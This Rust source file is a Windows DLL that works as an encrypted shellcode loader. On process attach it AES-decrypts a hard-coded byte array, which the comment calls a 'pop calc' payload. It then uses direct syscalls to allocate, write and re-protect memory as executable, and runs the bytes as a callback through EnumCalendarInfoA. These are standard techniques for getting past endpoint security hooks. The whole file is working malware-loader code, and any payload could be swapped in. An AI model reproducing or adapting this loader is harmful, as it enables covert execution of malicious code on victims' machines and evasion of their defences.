use std::{ptr, ffi::c_void};
use aes::cipher::block_padding::Pkcs7;
use aes::cipher::{KeyIvInit, BlockDecryptMut};
use rust_syscalls::syscall;
use windows::Win32::Foundation::BOOL;
use windows::Win32::Globalization::{EnumCalendarInfoA, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1};
use windows::Win32::System::Memory::{PAGE_READWRITE, MEM_RESERVE};
use windows::Win32::System::SystemServices::{DLL_THREAD_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_DETACH};
use windows::Win32::System::Threading::GetCurrentProcess;
use windows::Win32::{Foundation::{HINSTANCE, HANDLE}, System::{SystemServices::DLL_PROCESS_ATTACH, Memory::{MEM_COMMIT, PAGE_EXECUTE_READ}}};
use windows::core::PCSTR;


#[no_mangle]
#[allow(non_snake_case)]
fn DllMain(_hinst: HINSTANCE, fdwReason: u32, _lpvReserved: c_void) -> BOOL {
    match fdwReason {
        DLL_PROCESS_ATTACH => run(),
        DLL_THREAD_ATTACH => return BOOL(1),
        DLL_PROCESS_DETACH => return BOOL(1),
        DLL_THREAD_DETACH => return BOOL(1),
        _ => return BOOL(0),
    };
    return BOOL(1);
}

fn resolve_data() -> Vec<u8> {
    // pops a calc
    let mut data: Vec<u8> = vec![
        0xa7,0xfe,0x77,0xd2,0x3d,0xd8,0x45,0x64,0x77,0x8d,0x92,0xf9,0x85,0xac,0x99,0x71,0xdc,0xd4,0xb9,0x11,0xd2,0xa0,0x5d,0x09,0xf8,0xe3,0xa6,0xe4,0x61,0xec,0xf3,0x90,0x98,0x1c,0x38,0x46,0x36,0x22,0xfb,0xe6,0x30,0x4f,0xcb,0x12,0x6e,0x10,0x03,0x58,0xb6,0xa4,0x9d,0x64,0xb3,0x41,0x1f,0x0c,0xd3,0x52,0xdc,0xb0,0xb5,0x2f,0x8f,0x0d,0x2f,0x4e,0xd8,0x96,0x4b,0x3b,0x9c,0xe7,0x8f,0xc8,0xc4,0x76,0x5a,0xf5,0x31,0x82,0x12,0xd3,0xd4,0x35,0x2d,0x96,0x6e,0x4d,0xdf,0x43,0x29,0xd5,0x43,0xbc,0xf0,0x1d,0x07,0x11,0xf2,0x80,0xfd,0xb2,0x85,0xe0,0x38,0x0d,0x05,0xdf,0xa3,0x8f,0x09,0xef,0x1c,0x00,0xdc,0x85,0x6f,0xc4,0x64,0x6a,0x6c,0xad,0x6b,0xd4,0xae,0xf2,0x68,0x0b,0x86,0x70,0x8f,0x05,0xee,0x1f,0x7d,0xca,0x91,0x58,0x48,0x59,0x04,0xf0,0x5a,0xff,0xed,0x4d,0x82,0x5d,0x88,0xae,0xc4,0x7d,0xf8,0x32,0x9e,0xb9,0xe8,0x5e,0xfd,0x6c,0x9a,0xc8,0x10,0x5e,0x76,0x28,0xe5,0xa9,0xb1,0xb9,0x6f,0x34,0x46,0x4a,0xd2,0x94,0x25,0xdd,0xb5,0x92,0xfd,0xc3,0x91,0xb9,0xda,0xb2,0x7b,0x91,0x6a,0xa4,0x00,0x71,0x8b,0x23,0x9a,0xca,0x49,0x76,0xce,0x01,0xa1,0x62,0xb7,0x0e,0xd0,0x9a,0x39,0x72,0xe9,0x8c,0x69,0xf2,0xa9,0xc4,0x89,0xf5,0x2a,0x35,0x88,0xd4,0x21,0x12,0xb0,0xb4,0x7a,0x4c,0x0f,0xff,0x97,0xba,0xd9,0x38,0x97,0x54,0xfd,0x0d,0x2f,0x70,0xff,0xc8,0x9c,0x33,0x23,0x85,0x4a,0x00,0x34,0x40,0x68,0x65,0xfd,0x83,0xc2,0x4e,0xaa,0x90,0xd0,0x9d,0xd0,0x0d,0x0c,0x36,0xc7,0x03,0x7c,0x7d,0x54,0x57,0xfd,0x71,0x26,0x64,0xc3,0x89,0x56,0x5d,0xe5,0xf1,0x0e,0x22,0x01,0x6c,0xd1,0x15,0xe7,0xad,0x2c,0x13,0x80,0x64,0x7e,0x02,0x07,0x2e,0x0f,0xd5,0x52,0x60,0xe5,0xab,0x45,0x5a,0xae,0xef
    ];

    let key: [u8; 16] = [0x5f,0xa9,0x23,0x9f,0x34,0x16,0x77,0x91,0xda,0x77,0x78,0xd0,0xeb,0xc5,0x7f,0x54];
    let iv: [u8; 16] = [0x0c,0xcc,0xdd,0x78,0x45,0x58,0x1d,0xe0,0x16,0x86,0xe1,0xc0,0xdf,0xfe,0xaa,0xb0];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
    let ddata = Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(data.as_mut_slice()).unwrap();
    return ddata.to_vec();
}

#[no_mangle]
fn run() -> BOOL {
    let mut data: Vec<u8> = resolve_data();
    let bytes_len: usize = data.len();
    let zb: usize = 0;
    let mut outsize: usize = bytes_len;

    unsafe {
        let h_proc: HANDLE = GetCurrentProcess();

        let mut exec_mem: *mut c_void = ptr::null_mut();
        
        let mut status: i32 = syscall!("NtAllocateVirtualMemory", h_proc, &mut exec_mem, zb, &mut outsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if status != 0 {
            return BOOL(0);
        }

        let mut bytes_written: usize = 0;
        status = syscall!("NtWriteVirtualMemory", h_proc, exec_mem, data.as_mut_ptr(), bytes_len, &mut bytes_written);
        if status != 0 {
            return BOOL(0);
        }

        let mut old_protect: usize = usize::MAX;
        status = syscall!("NtProtectVirtualMemory", h_proc, &mut exec_mem, &bytes_len, PAGE_EXECUTE_READ, &mut old_protect);
        if status != 0 {
            return BOOL(0);
        }

        let cb: unsafe extern "system" fn(PCSTR) -> BOOL = std::mem::transmute(exec_mem);

        const LOCALE_USER_DEFAULT: u32 = 1024;
        
        EnumCalendarInfoA(Some(cb), LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
        
    }
    return BOOL(1);
}